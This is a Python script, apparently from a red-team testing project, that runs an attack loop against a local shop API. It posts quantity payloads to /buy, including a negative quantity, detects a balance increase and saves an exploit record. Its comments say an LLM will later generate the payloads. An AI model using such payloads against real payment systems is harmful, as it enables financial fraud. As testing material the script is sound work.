import requests
import json
import sys

TARGET_URL = "http://localhost:8000"
ENDPOINT = "/buy"


def log(step, message, status="INFO"):
    # Simple color coding for terminal
    colors = {"INFO": "\033[94m", "SUCCESS": "\033[92m", "FAIL": "\033[91m", "RESET": "\033[0m"}
    print(f"{colors.get(status, '')}[{step}] {message}{colors['RESET']}")


def attack():
    log("INIT", "Starting Red Agent Attack Loop...", "INFO")

    # 1. Get initial state
    initial_balance = requests.get(f"{TARGET_URL}/wallet").json()["balance"]
    log("SCAN", f"Initial Wallet Balance: ${initial_balance}", "INFO")

    # 2. Define Mutations (The "Dumb" AI)
    # In Week 2, an LLM will generate these. Today, we hardcode patterns.
    payloads = [
        {"item": "apple", "quantity": 1},  # Normal
        {"item": "apple", "quantity": 0},  # Edge case
        {"item": "apple", "quantity": 1000},  # Overflow attempt
        {"item": "apple", "quantity": -5}  # THE EXPLOIT
    ]

    for attempt, payload in enumerate(payloads):
        log("ATTACK", f"Testing payload: {payload}", "INFO")

        try:
            response = requests.post(f"{TARGET_URL}{ENDPOINT}", json=payload)
            data = response.json()

            # 3. Analyze Impact (The "Brain")
            # Did we gain money? (Logic Bug Detection)
            current_balance = requests.get(f"{TARGET_URL}/wallet").json()["balance"]

            if current_balance > initial_balance:
                log("PWNED", f"CRITICAL VULNERABILITY FOUND!", "SUCCESS")
                log("PROOF", f"Balance increased from {initial_balance} to {current_balance}", "SUCCESS")

                # 4. GENERATE THE CONTRACT (For Coder B)
                exploit_artifact = {
                    "vulnerability_type": "Logic/Financial",
                    "endpoint": ENDPOINT,
                    "payload": payload,
                    "exploit_logic": "Negative quantity resulted in balance increase.",
                    "severity": "High"
                }

                with open("shared/exploit.json", "w") as f:
                    json.dump(exploit_artifact, f, indent=2)

                log("EXPORT", "Exploit artifact saved to shared/exploit.json", "SUCCESS")
                return  # Stop after finding one

            elif response.status_code == 200:
                log("RESULT", "Request accepted, but no exploit detected.", "INFO")
            else:
                log("RESULT", f"Blocked: {data.get('detail')}", "FAIL")

        except Exception as e:
            log("ERROR", str(e), "FAIL")

    log("END", "Attack loop finished.", "INFO")


if __name__ == "__main__":
    attack()